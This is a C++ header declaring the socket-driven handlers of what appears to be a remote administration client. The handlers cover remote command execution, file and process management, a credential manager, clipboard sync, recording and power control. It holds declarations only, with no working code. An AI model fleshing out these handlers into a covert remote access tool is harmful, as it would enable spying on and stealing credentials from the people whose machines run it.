#ifndef WRAPPERS_H
#define WRAPPERS_H

#include <string>
#include <vector>
#include "utils.h"
#include "sockets.h"

// Wrapper API that main.cpp expects
std::string exec_command(const std::string& cmd);
bool send_all(sock_t sock, const char* buffer, size_t length);
bool recv_all(sock_t sock, char* buffer, size_t length);

void open_file_manager(sock_t sock, const json& payload, const std::string& client);
void start_credential_manager(sock_t sock, const json& payload, const std::string& client);
void open_process_manager(sock_t sock, const json& payload, const std::string& client);
void send_system_info(sock_t sock, const json& payload, const std::string& client);
void start_chat(sock_t sock, const json& payload, const std::string& client);
void handle_power_control(sock_t sock, const json& payload, const std::string& client);
void sync_clipboard(sock_t sock, const json& payload, const std::string& client);

void manage_sessions(sock_t sock, const json& payload, const std::string& client);


void start_recording(sock_t sock, const json& payload, const std::string& client);
void show_help(sock_t sock, const json& payload, const std::string& client);




#endif // WRAPPERS_H
